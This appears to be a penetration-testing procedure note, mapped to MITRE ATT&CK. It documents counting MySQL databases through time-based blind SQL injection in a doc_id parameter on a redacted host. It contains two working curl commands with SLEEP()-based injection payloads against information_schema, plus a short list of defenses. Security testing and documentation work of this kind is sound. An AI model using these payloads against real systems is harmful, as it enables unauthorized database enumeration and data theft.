---
tags:
  - enumeration
  - database
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands:
  - '[[commands/database-enumeration-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.239Z'
sub_techniques: []
id: 94ff0549-8db4-4541-a603-fdf8a2b3c97a
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Enumerate-Database-Count-via-Blind-SQLi

## Summary

This procedure uses blind SQLi to enumerate the number of databases on the MySQL server via conditional time delays, serving as a POC for data exfiltration potential.

## Description

Leveraging the confirmed time-based SQLi in doc_id, query the information_schema.schemata table to count databases. Use boolean conditions with SLEEP() to infer the count (e.g., if COUNT(*) = 3, delay occurs). In this case, 3 databases were identified without extracting names or further data.

## Requirements

1. Working time-based SQLi confirmed
2. Knowledge of MySQL schema queries
3. Script or manual iteration for binary search if needed

## Defense

Defensive measures and detection strategies:

- Restrict access to information_schema in MySQL grants
- Implement row-level security or query limits
- Detect repeated conditional queries in logs
- Use anomaly detection on database query patterns

## Objectives

1. Extract database count as initial POC
2. Demonstrate potential for broader enumeration
3. Assess impact without full compromise

## Instructions

### Step 1: Query Database Count with Condition

**Context**: Inject a COUNT query conditioned to a known value (e.g., 3) to trigger delay if true.

**Command** ([[commands/database-enumeration-poc]]):
```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT COUNT(*) FROM information_schema.schemata)=3, SLEEP(5), 0))" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
```

> Delay confirms count=3; adjust value to binary search if unknown.

### Step 2: Verify with False Condition

**Context**: Test a false condition (e.g., =4) to ensure no delay, validating the technique.

**Command** ([[commands/database-enumeration-poc]]):
```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT COUNT(*) FROM information_schema.schemata)=4, SLEEP(5), 0))" --max-time 10 -w "%{time_total}\n" -s -o /dev/null
```

> No delay expected, confirming accurate inference.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/database-enumeration-poc]]

## Tools Used


## Tags

- [[enumeration]]
- [[mysql]]
